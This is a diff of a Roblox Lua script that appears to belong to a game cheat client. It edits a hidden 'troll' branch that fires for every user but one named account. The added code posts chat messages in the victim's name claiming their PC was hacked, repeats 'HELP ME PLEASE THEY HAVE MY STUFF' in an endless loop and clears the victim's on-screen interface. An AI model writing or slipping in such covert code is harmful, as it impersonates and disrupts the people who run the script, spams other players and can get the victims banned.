@@ -26,13 +26,13 @@ if game.Players.LocalPlayer.Name ~= "Sammywammylol502" and troll then
         })
     })
 	--game.CoreGui.RobloxGui:Destroy()
-	game.TextChatService.TextChannels.RBXGeneral:SendAsync('Hey I\'m a cheater!')
+	game.TextChatService.TextChannels.RBXGeneral:SendAsync('Hi I am totally not cheating using vastal rn')
 	task.wait(0.5)
-	game.TextChatService.TextChannels.RBXGeneral:SendAsync('im a stupid cheater')
+	game.TextChatService.TextChannels.RBXGeneral:SendAsync('BRO THEY GOT MY PC OMGGGG')
 	task.wait(0.5)
-	game5.TextChatService.TextChannels.RBXGeneral:SendAsync('use the vastal client now!')
-	task.wait(0.5)
-	game.TextChatService.TextChannels.RBXGeneral:SendAsync('nooo im a cheater =(')
+	task.wait(1)
+	game.Players.LocalPlayer.PlayerGui:ClearAllChildren()
+	task.spawn(function() while task.wait(1.5) do game.TextChatService.TextChannels.RBXGeneral:SendAsync('Dude HELP ME PLEASE THEY HAVE MY STUFF') end end)
 end
 for _, v in ipairs(game.CoreGui:GetDescendants()) do
 	if v.Name:find("WindUI") then
